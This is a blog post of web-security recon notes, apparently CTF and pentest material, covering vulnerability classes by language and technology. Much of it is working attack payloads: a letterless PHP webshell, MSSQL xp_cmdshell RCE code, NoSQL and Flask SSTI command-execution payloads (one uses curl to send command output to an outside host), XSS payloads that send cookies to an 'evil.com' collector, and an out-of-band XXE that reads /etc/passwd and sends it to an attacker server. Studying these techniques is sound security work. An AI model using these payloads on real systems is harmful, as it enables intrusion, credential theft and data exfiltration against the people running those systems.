---
layout: post
published: true
title: Recon notes
date: 2021-08-2 18:54 +0600
author: credit to gros
category: Recon notes
tags: [web]
permalink: /Recon-notes
featured: false
---
* TOC
{:toc}

### Vuln types

```
Client side:
    XSS
    CSRF
    session fixation
    open redirects
    header injection
    websockets / localStorage tests
    websockets hijacking
    jsonp leaks
    OAuth token theft
    path-relative stylesheet import
    same origin method execution
    http response splitting/smuggling
    names and email addresses appearing in HTML comments
    reverse tabnabbing
    referer token leakage

Server side:
    Injections:
        + sql / nosql
        + cmd
        + expression language (https://www.mindedsecurity.com/fileshare/ExpressionLanguageInjection.pdf)
        + template injection
        + Server Side Include (.shtml)
        + server side javascript execution
        + ldap
        + CSS
            + extract attributes with input[value^=""]
            + extract whatever with fonts (https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)
        + mail header
        + xpath
        + log injection
        + OGNL

    SSRF
    XXE
    misconfig:
        + cors
        + host header manipulation
            + host header poisoning (https://www.skeletonscribe.net/2013/05/practical-http-host-header-attacks.html)
        + TRACE enabled
        + clickjacking
        + session timeouts
        + login throttling (anti-bruteforce)
        + _method=PUT etc checks (csrf bypass...)
        + cross-domain policy 
        + cookie scope
        + sensitive data in url
        + directory listings
        + caching of sensitive data
        + backdoor cookies/parameters
        + SMTP not checking server identity
        + methods not checked/restricted (GET, PUT etc)

    path traversal
    local/remote file inclusion
    file upload
    auth bypass
        + pass reset: the same token for all users (in given second)
    parameter pollution
    race conditions
    user enumeration
    mass assignments / autobinding / Object injection
    regex bypass/eval/dos ([a-zA-Z]+)*, (a+)+ or (a|a?)+ etc)
    search indexing of credentials (private data cached by google etc)

    memory leaks:
        - https://github.com/neex/gifoeb
        
    subdomain takeover:
        -unused subdomains and aliases (CNAME)
        -CNAME pointing to unregistered domain
        -trailing dots (bypassess in cloud providers)

    password bruteforce
        - https://hackerone.com/reports/127844

    httpoxy (mostly php 7.0.8)
    path equivalence vulnerability
    image tragic
    insecure direct object reference
    session puzzling
    smtp header injection
    deserialization
    rounding errors / integer overflows
    cache-deception
    table truncation
    hidden files (.git, .DS_Store)
    broken logout functions
    format string (%s, %d, {0:x})
    bad hexadecimal concatenation (when two different hashes are converted to the same value)
    null byte injection
    pdf export injection (https://securityonline.info/export-injection-new-server-side-vulnerability/)
    csv injection
    side-channel leaks with f.e. Chrome Auditor or Windows Defender (https://github.com/icchy/wctf2019-gtf)
    old (open)ssl
    utf8 normalization/Case Mapping Collisions (utf.toLower() == some_ascii) (https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/)
```

Cheatsheets:
* [find-sec-bugs](https://find-sec-bugs.github.io/bugs.htm)

<!-- 
    ---------------------------------------------------------------
 LANGUAGES
    ---------------------------------------------------------------
 -->
### Languages

#### #PHP
* file extensions (most servers parse them as php)
    + .pht
    + .phtml
    + php3
    + php4

* non-common php tags
    + ```<script language="php"></script>```
    + ```<% %>```
    + ```<?=```

* shell without letters/numbers
    ```{% raw %}
    <?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
    # <?=$_GET[_]($_GET[__]);
    {% endraw %}```

* parse_url function
    + [relative url problem (//domain.com?asd)](<https://bugs.php.net/bug.php?id=43721>)
    + [http://example.com:80?@google.com/](<https://bugs.php.net/bug.php?id=73192&edit=3>)

* readfile + windows -> filenames blacklist bypass via [8.3 filenames](https://en.wikipedia.org/wiki/8.3_filename)
    + [ctf example](https://blog.0daylabs.com/2016/09/06/using-windows-shortfilename-feature-lfi/)

* preg_match -> bypass via pcre.backtrack_limit
    + create text that will force recursion in vulnerable regex
    + it will fail with warning possibly bypassing protections like
        ```
        if(preg_match("", $_POST['input']) == 0) {
            // process user input...
        }
        ```

* type juggling / weak comparison operator
    + [insomnia pdf](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)
    + [gynvael blog](http://gynvael.coldwind.pl/?id=492)

* base_dir bypass:
    + SplFileObject

        ```$file = new SplFileObject("/var/www/html/blabla/test.php", "w"); $file->fwrite('shell');```
    + pcntl_exec 

        ```pcntl_exec("/bin/bash", "&pkill -9 bash >out");echo file_get_contents("out");```
    + linkinfo, realpath <= 5.3.6
    + [symlinks](https://bugs.php.net/bug.php?id=66171)
    + [mail() + logs](https://packetstormsecurity.com/files/80230/PHP-5.3.0-open_basedir-Bypass.html)
    + [chdir(base_dir,...)](http://91.121.31.50/phuck3.txt)
        ```
        ini_set('open_basedir','..');chdir('..');chdir('..');ini_set('open_basedir','/');
        ```

* disable_functions bypass
    + [LD_PRELOAD + mail()](https://rdot.org/forum/showpost.php?p=38750&postcount=16>)

* disallow file write access bypass
    + [PHP OPcache Override](https://github.com/GoSecure/php7-opcache-override)

* code evaluation
    + [complex (curly) syntax](http://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex)
        + [ebay example](http://secalert.net/#ebay-rce-ccs)
    + heredoc syntax
    + user-supplied values in double-quotes
    + eval
    + create_function
    + preg_replace with /e

* assert is eval
* [extract is evil](https://davidnoren.com/post/php-extract-vulnerability.html)
    + ```&q=fake&sql=fake&query=fake&db=fake&host=fake```
* [file_exists etc may be](https://blog.ripstech.com/2018/phpbb3-phar-deserialization-to-remote-code-execution/)

* [object instantation](https://leakfree.wordpress.com/2015/03/12/php-object-instantiation-cve-2015-1033/)
    ```
    $model = $_GET['model'];
    $object = new $model();
    ```

* unlink with wrong folder don't work? (<https://rdot.org/forum/showthread.php?t=3102>)
* image resize bypass
    + [tool](https://github.com/RickGray/Bypass-PHP-GD-Process-To-RCE)

* basic auth with vulnerable `<limit>` bypass
    + [non-standard request methods](https://www.reddit.com/r/netsec/comments/st9nc/bypassing_http_basic_authentication_in_php/)

* LFI/RFI wrappers
    + input
    + data `data://text/plain;base64,command | data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==`
    + filter `php://filter/convert.base64-encode/resource=index.php`
    + file
    + zip `zip://zipfile#php_file.php`
    + phar
    + expect
    + glob
    + [iconv](http://gynvael.coldwind.pl/?lang=en&id=671)
    + crypto
    + gopher
    + fd
    + telnet
    + ftp
    + tftp
    + nntp
    + jar
    + scp
    + ssh
    + ssh2
    + ldap
    + dict
    + ogg

* LFI to RCE
    + Using file upload forms/functions
    + Wrappers
    + Files
        + /proc/self/environ
        + /proc/self/fd
    + Log files with controllable input:
        + /var/log/apache2/access.log
        + /var/log/apache2/error.log
        + /var/log/vsftpd.log
        + /var/log/sshd.log
        + /var/log/mail
        + /var/lib/nginx/cache
    + PHPInfo script
    + php sessions
    + Endings:
        + null byte
        + truncation
    + [tmp files with self inclusion](https://dustri.org/b/from-lfi-to-rce-in-php.html)

* common files
    + phpunit.xml.dst (in LAMP)
* webshell using POST files
    ```<? `. /*/*J;` // will execute when there is /tmp/*J file with your POST data```
* [Inject SESSION data](https://blog.orange.tw/2018/10/hitcon-ctf-2018-one-line-php-challenge.html)
    ```curl http://127.0.0.1/ -H 'Cookie: PHPSESSID=iamorange' -F 'PHP_SESSION_UPLOAD_PROGRESS=blahblahblah'  -F 'file=@/etc/passwd'```


#### #Java
* /jmx-console
* /web-console/Invoker
* /invoker/JMXInvokerServlet and /invoker/EJBInvokerServlet
* Java Naming and Directory Service at ports 1098, 1099
* RMI at port 4444, 1099
* directly accessible jsp files (vs struts actions)
* struts
    + dmi: `?method:somePublicMethodToCall=1, /action!method.do?username=value`
    + extensions: .action, .do, .go
    + actions with user controlled input, like:
        ```
        <action name="someAction" class="com.SomeAction" method="DoSomething">
            <result name="typeResult" type="dispatcher">
                <param name="location">/resources/${theType}.jsp</param>
            </result>
        </action>
        Now read files with ?method:getAnyString&anyString=typeResult&theType=../WEB-INF/web.xml?
        ```
    + getText(user_input) -> ognl injection
* spring
    + mass assignment because of (@modelAttribute)[http://agrrrdog.blogspot.com/2017/03/autobinding-vulns-and-spring-mvc.html]
* injections: ```{% raw %}%{3*2} ${3*5} ${%{4*5}} ${T(java.lang.Runtime).getRuntime().exec("cmd.exe")}{% endraw %}```
* jsessionid in url parameter rewrited to response (html response splitting)
* regexs to check
    ```
    java.lang.ClassLoader.defineClass
    java.net.URLClassLoader
    java.beans.Instrospector.getBeanInfo
    openConnection

    getResource
    java.io.FileInputStream
    java.io.FileOutputStream
    java.io.FileReader
    java.io.FileWriter
    java.io.RandomAccessFile

    System.load
    System.loadLibrary
    exec
    ProcessBuilder
    getRuntime

    ObjectInputStream
    readObject
    readObjectNodData
    readResolve
    readExternal
    XMLDecoder
    xstream.fromXML
    ObjectInputStream.readUnshared
    enableDefaultTyping
    JsonTypeInfo.Id.CLASS
    JsonTypeInfo.Id.MINIMAL_CLASS

    freemarker.template.Template
    javax.script.ScriptEngine.eval
    
    ServletDispatcherResult
    createNativeQuery
    isELIgnored=false
    getELContext
    createValueExpression
    parseExpression
    ognlUtil.getValue
    ScriptEngineManager
    ELAsString

    spring:eval
    SSLContext.getInstance("SSL") -> SSLContext.getInstance("TLS")
    getSession().setAttribute
    ```
* [sonar rules](https://rules.sonarsource.com/java/type/Vulnerability/RSPEC-4435)
    ```
    LDAP serialization entities
    Persistent entities with @RequestMapping
    ```
* jsp include injection
    ```
    <%@include file="" %>
    <jsp:include page=""/> 
    ```
* server side redirects
    ```
    request.getRequestDispatcher("./"+user_input+".jsp").include(request, response)  // with user_input == "applicationContext.xml?""
    return new ModelAndView(user_input);
    Return new ActionForward(user_input); 
    ```


#### #SQL
* hex encoding
    + union select X'31333337' -> union select 1337
* charsets big5, cp932, gb2312, gbk and sjis
    + [\xbf\x27 escaped to \xbf\x5c\x27, but \xbf\x5c are treated as one char, leaving \x27 unescaped](http://stackoverflow.com/questions/5741187/sql-injection-that-gets-around-mysql-real-escape-string/12118602#12118602)
* [Hibernate + H2 db: non-breaking-space is not recognized by Hibernate](https://github.com/p4-team/ctf/tree/master/2016-01-29-nullcon/web_5#eng-version)
* WAF bypass with %0b,%0c,0%a, /\*\*/, like that: sel%0bect
* oracle db
    ```
    # rce
    EXEC master..sp_configure 'show advanced options',1;
    RECONFIGURE WITH OVERRIDE;
    EXEC master..sp_configure 'xp_cmdshell',1;
    RECONFIGURE WITH OVERRIDE;
    EXEC master..sp_configure 'show advanced options',0;
    RECONFIGURE WITH OVERRIDE;
    DECLARE @result TABLE (asd VARCHAR(512));
    declare @cmd nvarchar(1000);
    DECLARE @data VARCHAR(8000);
    set @cmd = \''''+cmd+'''\';
    INSERT INTO @result
         execute xp_cmdshell @cmd;
    SELECT @data = asd FROM @result;
    SELECT 'output: '+@data AS output INTO rce_result;

    # hex encoded payload execute
    DECLARE @S VARCHAR(4000);
    SET @S=CAST(payload_in_hex AS VARCHAR(4000));
    EXEC(@S);
    ```
* bypass comments
    ```selet * from x where /*!user='admin'*/  -> or /*+*/```
* unicode in mysql
    ```mysqli_set_charset($conn,"utf8"); select 'admin' = 'àdmin';   # will return 1```

#### #NOSql
* arrays: 
    + `{"$gt": ""}, &input[$ne]=1`
* horizontal auth bruteforce:
    + `user[$in][]=admin&user[$in][]=user&pass=abc123 ; {user: {"$in": ["admin", "user"]}}`
    + `user[$regex]=a&pass=abc123`
* `db.run(user input)` is like classical sql injection
* JavaScript code can execute within the database engine inside:
    + $where
    + group
    + map-reduce
* protection:
    + getting rid of the qs module
* payloads:
    ```
    # mostly from https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt
    (function(){var date = new Date(); do{curDate = new Date();}while(curDate-date<10000); return Math.max();})()
    '0; return true'
    '0; while(true){}'
    true, $where: '1 == 1'
    , $where: '1 == 1'
    $where: '1 == 1'
    ', $where: '1 == 1'
    1, $where: '1 == 1'
    { $ne: 1 }
    ', $or: [ {}, { 'a':'a
    ' } ], $comment:'successful MongoDB injection'
    db.injection.insert({success:1});
    db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1
    || 1==1
    ' && this.password.match(/.*/)//+%00
    ' && this.passwordzz.match(/.*/)//+%00
    '%20%26%26%20this.password.match(/.*/)//+%00
    '%20%26%26%20this.passwordzz.match(/.*/)//+%00
    {$gt: ''}
    [$ne]=1
    ';sleep(5000);
    ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);
    ```


#### #Python
* url_parse in python problem with path params `(http://example.com?asd;xxx)`
* upload \__init__.py file + import
* app.secret_key in flask -> you know it, you can spoof session cookies
* flaks SSTI: `from_string`, `render_template_string`, templates with non-common extension have disabled auto-escaping
* flask sqlalchemy injection: `sqlalchemy.expression.text`, `execute`
* flask threading: `g` and `_context_` are tricky
* flask uses his error pages only for specified addresses, including 127.0.0.1
* flask rce payloads
    ```
    {% raw %}
    
    {% for x in {}.__class__.__base__.__subclasses__() %}{% if hasattr(x,'_module') %}{{x._module.__builtins__['__import__']('os').system("ls")}}{% endif %}{% endfor %}

    {% set loadedClasses = " ".__class__.__mro__[2].__subclasses__() %}
    {% for loadedClass in loadedClasses %} {% if loadedClass.__name__ == "catch_warnings".strip() %}
        {% set builtinsReference = loadedClass()._module.__builtins__ %}
        {% set os = builtinsReference["__import__".strip()]("subprocess".strip()) %}
            {{ os.check_output("cat sha4/flag_bilaabluagbiluariglublaireugrpoop".strip(), shell=True) }}
        {% endif %}
    {% endfor %}

    {{config}}
    {{ url_for.globals.current_app.config }}

    {% for key in ''['__class__']['__mro__'][1]['__subclasses__']() %}
        {% if key['__name__'] == "Popen" %}
            {% if key("curl 908337901:8001 -d $(/readflag)", shell=True, stdout=-1)['communicate']()[0] %}
            {% endif %}
        {% endif %}
    {% endfor %}
    
    {% endraw %}
    ```
* objects comparison: `"1">5 -> True`
* [format is exploitable](http://lucumr.pocoo.org/2016/12/29/careful-with-str-format/): `'{your_input}'.format(some_python_object)` like `'{0.__class__}'.format(object)`
* web cache dirs:
    ```
    /__pycache__/__init__.cpython-35.pyc
    /__pycache__/conf.cpython-35.pyc
    /__pycache__/app.cpython-35.pyc
    ```
* Werkzeug debbuger

* we can replace '\x0a' with '\x0d', it still will be correct python script (useful when getting code with `input()`)

* its possible to send urlencoded data as path, i.e. "GET /%41%41%41 HTTP/1.1" == "GET /AAA HTTP/1.1" (at least in flask dev)

* [C preprocessor with Digraphs for blacklist bypass](https://en.wikipedia.org/wiki/Digraphs_and_trigraphs#C)

* [wsgi + ssrf (pycurl) + UWSGI_FILE == rce](https://zaratec.github.io/2018/12/20/rwctf2018-magic-tunnel/)

* [default args are evaluated only once](https://www.toptal.com/python/top-10-mistakes-that-python-programmers-make)
    ```python
    def foo(a=[]):
        a.append("X")
        return a

    In [1]: foo()                                                             
    Out[1]: ['x']

    In [2]: foo()                                                             
    Out[2]: ['x', 'x']
    ```

* exception handling, `except ValueError, IndexError:` will catch only ValueError

* [numpy not always clears memory](https://github.com/satwikkansal/wtfpython#-teleportation-), f.e. `np.empty()`


#### #Ruby
* URI(params[:url]).scheme == 'http' bypass by creating 'http' dir
* `open(params[:url]) -> rce with |ls`


#### #Perl
* params pollution (```$x=asd&$x=fre -> array```)
* dicts are expanded with arrays
* can be broken in many ways: [Camel](https://events.ccc.de/congress/2014/Fahrplan/system/attachments/2542/original/the-perl-jam-netanel-rubin-31c3.pdf), [Camel strikes back](https://www.blackhat.com/docs/asia-16/materials/asia-16-Rubin-The-Perl-Jam-2-The-Camel-Strikes-Back.pdf)


#### #Bash
* no white spaces: ```{echo,a,b}; echo$FISa$FISb```
* num bases
    + `"obase=16; 11" | bc`
    + `$((16#111))`
* cmd without letters/numbers
    ```
    /???/??? ./
    # /bin/cat ./
    ```
* Bash reads scripts (in chunks)[https://thomask.sdf.org/blog/2019/11/09/take-care-editing-bash-scripts.html]. So editing a script when it is running may cause some problems.


#### #node.js
* create Buffer(x) with x as number will create Buffer with x bytes of uninitialized memory -> memory leak
* eval, setTimeOut, setInterval, unserialize, exec
* parameters pollution, params are concatenate with ","
* payloads
    ```
    require('fs').readFile('/etc/passwd',function(err,data){if(!err){res.end(data.toString())}})
    ```
* check for debug mode:  https://app/%2
* comparison operators: == doesn't checks types
* anty-xss: npm install html-entities
* find vulnerable packages: snyk, node-check, nsp
* static code analysis: NodeJsScan
* SQLi with brackets and [template filters](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals):
    ```nodejs
    correct: const result = await req.db.all `SELECT id, title FROM notes WHERE id = ${req.params.noteId}`;
    vuln:    const result = await req.db.run(`SELECT id, title FROM notes WHERE id = ${req.params.noteId}`);
    ```
* utf8 path traversal
    ```nodejs
    var path = req.query.path;
    if (path.indexOf("..") == -1) {
        get_cos(path, callback);
    }
    // http://example.pl/sandbox/ＮＮ/passwd
    // Ｎ to U+FF2E
    ```
* [square brackets](https://github.com/nodesecurity/eslint-plugin-security/blob/master/docs/the-dangers-of-square-bracket-notation.md) with user data are vuln: `whatever[user_input] = user_input2`
* [best practices](https://github.com/goldbergyoni/nodebestpractices)

#### #React/Electron
* XSSes ([cheatsheet](https://pragmaticwebsecurity.com/files/cheatsheets/reactxss.pdf))

  * `ReactDOM.render(payload_here, something)`

  * [Controll over tag/props/childres](https://www.netsparker.com/blog/web-security/cross-site-scripting-react-web-applications/)
    ```React.createElement(
      userInput.tag,
      [userInput.props]
      [...userInput.children]
    )
    is same as:
        <userInput.tag {...userInput.props}>{userInput.children}</userInput.tag>
    ```

  * `<script>window.__STATE__ = ${JSON.stringify({ data })}</script>`

  * `<a href="payload_here"></a> (src, srcdoc, ...)`

  * `dangerouslySetTheInnerHTML`

  * `React.useRef` - DOM manipulation


#### #GrapQL
* [injections? and introspection](https://www.abhaybhargav.com/from-the-trenches-diy-security-perspectives-of-graphql/)

#### #ASP NET (dotnet)
* insecure json deserialization with [TypeNameHandlings](https://www.alphabot.com/security/blog/2017/net/How-to-configure-Json.NET-to-create-a-vulnerable-web-API.html)

<!-- 
    ---------------------------------------------------------------
 Vulnerabilities
    ---------------------------------------------------------------
 -->
### Vulnerabilities

#### #XSS
* encoding in js
    + hex encoding
    + unicode
    + template strings

* string without quotes: `([]+/payload/).substr(1,7)`

* [xss-protector can disable some scripts (i.e. if script is found in url)](https://security.szurek.pl/0ctf-2016-guestbook-1-writeup.html)
* dom clobbering
* gettings httpOnly cookies
    + via phpinfo()
    + TRACE method (old, not working anymore)

* CSP bypass:
    + ```<link rel="prefetch" href="http://your-server/"> ```
    + ```<meta http-equiv="refresh" content="0; url=http://your-server/">```
    + wrong config (no defaults, forms etc)

* DNS rebinding

* [HTML5 stuff](https://html5sec.org)
* CSS injection
    + ```span[value$='1']{content: url('http://myhost/?i')}```
    + [with fonts](https://sekurak.pl/wykradanie-danych-w-swietnym-stylu-czyli-jak-wykorzystac-css-y-do-atakow-na-webaplikacje/)

* injection for PhantomJS

    ```http://yoururl.com/?"+require('fs').read('/etc/passwd');page.customHeaders={Host:'127.0.0.1'};var nonce="```

* xss in one domain, check if other domain's dns points to it

* xss in subdomain can interact with parent via iframe (X-Frame-Options can't be set to DENY or SAMEORIGIN)

* [content-type/extension comparison](http://pwndizzle.blogspot.com/2015/07/xss-extensions-and-content-types.html)

* xss with svg and image/svg+xml content-type or xml and application/xml content-type

* browsers parse as html content-type with comma, like that: image/foo,text/html

* [overlong utf-8, ie. \xc0\x81](https://securityonline.info/cross-site-scripting-xss-payloads/)

* frequent payloads
    ```
    <img src=x onerror=this.src='http://yourserver/?c='+document.cookie>
    <script>document.write('<img src="https://yourserver.evil.com/collect.gif?cookie=' + document.cookie + '" />')</script>
    <script>document.location= "http://www.example.com/cookie_catcher.php?c=" + document.cookie</script>
    ```

* windown.name for payload holding
    ```
    window.open('http://vulnsite/?xss_here="><svg/onload=$(body).html(name)', payload);
    // name == window.name == payload
    ```

* [iframe srcdoc](https://html5sec.org/#139)
    ```
    <iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;" />
    ```
* link import
    ```
    <link rel=import href=/xss.gif>
    xss.gif: GIF89a<script>alert(1)</script>
    ```

* almost inline comment
    ```js
    <script>
    alert()
    --> undefined()
    --> oups;} dupadupa'{
    </script>
    ```
* line separator with `\u2028` or `\u2029 (%E2%80%A9)` instead of `\n`

* [selective resource blocking with `<link rel=preload as=script integrity=sha256-1 href=filter.js>`](https://github.com/lbherrera/writeups/tree/master/pwn2win-2019/calc)

* json.dumps(user_input) placed in javascript context is vulnerable - insert "</script>". Json is not javascript. See [here](https://pypi.org/project/escapejson/).

* java applets
    ```
    #compile
    $ javac -source 1.7 -target 1.7 Java.java
    $ echo "Permissions: all-permissions" > ./manifest.txt
    $ jar cvf Java.jar Java.class
    $ keytool -genkey -keyalg rsa -alias MyCert
    $ jarsigner Java.jar MyCert -signedjar SignedJava.jar 
    $ mv SignedJava.jar Java.class /var/ww/html/
    $ echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.187:80/evil.exe"></applet>' > /var/www/html/java.html
    ```
* [reverse tabnabbing](https://owasp.org/www-community/attacks/Reverse_Tabnabbing)

#### #CSRF
* [magic parameters/headers](http://cxf.apache.org/docs/jax-rs.html#JAX-RS-Debugging)
    ```
    ?_method=POST
    ?_ctype=application/json
    X-Http-Method-Override: Post
    Request-method: Post
    ```
* [application/json content-type bypass with flash and 307 redirect](https://blog.appsecco.com/exploiting-csrf-on-json-endpoints-with-flash-and-redirects-681d4ad6b31b)
* [sum up pdf](https://2017.zeronights.org/wp-content/uploads/materials/ZN17_MikhailEgorov%20_Neat_tricks_to_bypass_CSRF_protection.pdf)


#### #Side channels
* (Using windows defender)[https://github.com/icchy/wctf2019-gtf]. If you can save on a server some file
which contains your payload and some secret you want to leak and Windows Defender will scan it (which it by default will do) you can construct an oracle.
* [Referer header containing secret token](https://blog.doyensec.com/2019/08/01/common-crypto-bugs.html#4-password-reset-token-leakage-via-referer) may be leaked to 3rd-party websites. F.e. password reset tokens in the url.


#### #Other
* [redis via http](http://www.agarri.fr/kom/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html)
* some frameworks rewrites route urls (ie. /admin -> /index.php/admin), can bypass htaccess auth (with Location directive)
* apache/zend: `<Limit GET POST>` [may be bypassed with GETS method](https://cd34.com/blog/web-security/hackers-bypass-htaccess-security-by-using-gets-rather-than-get/)
* wget
    + < 1.18 arbitrary file upload (CVE-2016-4971)
    + with get params (asd.txt?index.php) write to php file
    + [crlf injection (in host and sni)](https://lists.gnu.org/archive/html/bug-wget/2017-03/msg00018.html): `wget 'http://127.0.0.1%0d%0aHELLO example.com%0d%0aQUIT%0d%0a:25'`
* latex parsing -> can get rce `(\immediate\write18{ls})`
* rfc5988 - web links; returned file depends on Accept header (firefox only)
* HEAD request halt script execution at first output 
* Alternatives to localhost
    + 127.0.0.1
    + 2130706433
    + lvh.me
    + lacolhost.com
    + vcap.me,
    + localhost.tv
* [Kubernetes by default mounts secrets at: /var/run/secrets/kubernetes.io/serviceaccount and it allows compromise infrastructure](https://hackernoon.com/capturing-all-the-flags-in-bsidessf-ctf-by-pwning-our-infrastructure-3570b99b4dd0)
* tar with colon (:) in name try to connect to remote server, ie. tar -xf example.com:file
* link to self proc: /dev/fd/../environ
* google-proxy: Google data saver (compression) proxy may be used to bypass some filters
* [paypal: notify_url](https://developer.paypal.com/docs/classic/products/instant-payment-notification/) is used to send confirmation of payment from paypal. Server, after receiving request to that url, should ask paypal for confirmation that it's legit, otherwise site can be manipulated to think that payment was done. 
* captcha bypass: send correct captcha, then block requests to captcha images


#### #Security headers
* HSTS: Strict-Transport-Security 
* Clickjacking: X-Frame-Options
* XSS: X-XSS-Protection
* mime sniffing: X-Content-Type-Options
* xss, mixed content: Content-Security-Policy
* X-Permitted-Cross-Domain-Policies
* Referrer-Policy
* Caching:
```
public: cache, store - never re-request
no-cache: stored, not cached
no-store: cached, not stored
private: wtf - only client & server

Disable completely:
Cache-Control: no-cache, no-store, must-revalidate, max-age=0
Expires: -1
Pragma: no-cache
```

#### #CORS
* if Access-Control-Allow-Credentials not present:
    + client side cache poisoning (reflected xss in custom header)
    + server side cache poisoning


#### #HTTPS
* http should redirect (301) to https
* HSTS (Strict-Transport-Security: max-age=31536000; includeSubDomains; preload)
    + https://hstspreload.org
* mixed contents
* upgrade-insecure-requests CSP
    + ```<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">```
    + ```Content-Security-Policy: upgrade-insecure-requests```


#### #XXE
```
xml request:
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE xxe [ 
<!ENTITY % bbb SYSTEM "http://attacker/xxe.dtd"> %bbb; %encja;
]><xxe>&test;</xxe>

xxe.dtd on attacker server:
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY % test SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % encja '<!ENTITY test SYSTEM "http://gros.users.warchall.net/?p=%test;">'>
```

#### #XSLT
* [version info](https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf)
    ```
    <?xml version="1.0" encoding="utf-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
      <xsl:template match="/">
        <xsl:value-of select="system-property('xsl:version')"/>
        <xsl:value-of select="system-property('xsl:vendor')"/>
        <xsl:value-of select="system-property('xsl:vendor-url')"/>
      </xsl:template>
    </xsl:stylesheet>
    ```
* [file read with document](https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf)
    ```
    <xsl:template match="/">
        <xsl:value-of select="system-property('xsl:version')"/>
        <xsl:copy-of select="document('C:\file.xml')"/>
        <xsl:value-of select="document('http://localhost:25')"/>
    </xsl:template>
    ```
* standard XXE
    ```
    <!DOCTYPE xsl:stylesheet [
        <!ENTITY passwd SYSTEM "file:///etc/passwd" >]>
        <xsl:template match="/">
            &passwd;
        </xsl:template>
    ```


<!-- 
    ---------------------------------------------------------------
 Technologies and tools
    ---------------------------------------------------------------
 -->
### Technologies and tools

#### #Django
* when leaked secret_key :
    ```
    download django sources
    pip install -e ./django

    in python shell:
    from django.core import signing
    p = signing.loads(c, key, salt='django.contrib.sessions.backends.signed_cookies')  # read cookie
    print(p)
    # {'_auth_user_backend': 'django.contrib.auth.backends.ModelBackend','_auth_user_hash': '0bd0910002c734f0eb2228dd4cadb8fff477c3cf','_auth_user_id': '184'}
    # key_salt = 'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash'
    # password_admin == password hash from database
    # _auth_user_hash == django.utils.crypto.salted_hmac(key_salt, password_admin, key).hexdigest()

    signing.dumps(p, key, salt='django.contrib.sessions.backends.signed_cookies', compress=True) # signs
    ```

* django sqli:
    ```py
    # custom sql or %s with quotes == injection
    connection.cursor().execute("'%s'", [user_input])  
    QuerySet.objects.extra()
    django.db.models.expressions.RawSQL()
    YourModel.objects.raw(user_input)
    django.db.models.as_sql(..., extra_context={'x':user_input})  # injection with named args only
    django.db.models.Func(user_input=user_input)  # Func is base class, injection with named args only
    YourModel.objects.all().filter(user_input)  # maybe leak sensitive data with regex on some filed
    ```

* [Inefficient Database Queries](https://medium.com/@nnja/top-3-django-gotchas-to-catch-during-code-review-8eb1219708a#9d66) recommendations:
    * Access Foreign Keys (tweet.user_id instead of tweet.user.id)
    * Fetch Related Objects in a Single Query
    * Offload Complex Filtering to the Database

* Sensitive info exposure
    1. Use [sensitive_variables](https://docs.djangoproject.com/en/3.1/howto/error-reporting/#filtering-sensitive-information)
    2. Don't send [unencrypted emails](https://docs.djangoproject.com/en/3.1/howto/error-reporting/#server-errors) with sensitive info
    3. Don't store [sensitive info in logs](https://docs.djangoproject.com/en/3.1/topics/logging/#id5)

* [`obj` not initialized](https://medium.com/@nnja/top-3-django-gotchas-to-catch-during-code-review-8eb1219708a#d0b3)

* [ORM injection](https://github.com/nicwl/django-ctf-scrum/blob/master/WRITEUP.md)
    ```
    Post.objects.filter(user_input)
    ```

* Tools
    * https://github.com/facebook/pyre-check
    * https://code.google.com/archive/p/rough-auditing-tool-for-security/
    * https://pyup.io/safety/

#### #CURL
* Funny stuff with {} and [], i.e. `http://lvh.me/{uploads/1492563387EJ5e3yT5.png,flag.php}` make two requests and concat response
* Normaly it may change the url (f.e. replace // with / in path). May cause issues with tools like gitdump. Use `--path-as-is`


#### #REST
* WADL
    + /application.wadl path
    + OPTIONS + Accept: application/vnd.sun.wadl+xml
    + /application.xml
    + ?\_wadl=true
+ URI matching ambiguities
+ HTCR injection
    ```
    Accept\tapplication/json\rX-User-Id: 123 as two headers in wildfly
    ```
+ Content types (in header or multipart file)


#### #Apache
* with Tomcat: [file handling abuse by append %01 to end of filename (/whatever.jsp%01)](http://secalert.net/#scl-soh)
* Bypass `SetEnvIf X-Forwarded-For in config` with proper header (bruteforce ip maybe)
* Files
    + /icons/README
    + /manual/
    + /server-info
    + /server-status (mod_status)
    + /status-balancer


#### #Docker
* credentials for private Docker registry
* kernel exploit
* --net=host  allows the container access to networking services on the host -> escape (https://kitctf.de/writeups/32c3ctf/docker)
* --privileged disable all security*
* --icc blanket FORWARD ACCEPT iptables
* exposed rest api
* namespaces disabled by default (enable with --userns-remap)
* install docker inside container -> Docker socket may be mounted inside (/var/run/docker.sock)
* bind-mounting the rootfs into a new container image
* AppArmor: --security-opt="apparmor:<profile>", SElinux
* historical guest escape via CAP_DAC_READ_SEARCH
* network ports bind to all (host) interfaces by default
* The Docker client does not verify the TLS certificate by default, leading to a potential false sense of security: use --tlsverify
* Use No New Privileges: --security-opt=no-new-privileges
* Consider using the PID cgroup to limit the maximum number of processes, --kernel-memory
* Avoid running as root within privileged non-user namespace containers (useradd in dockerfile)
* Use --read-only when running containers and overall consider building an overall immutable architecture
* Avoid providing access to the docker user or docker group
* docker-bench-security
* Links: 
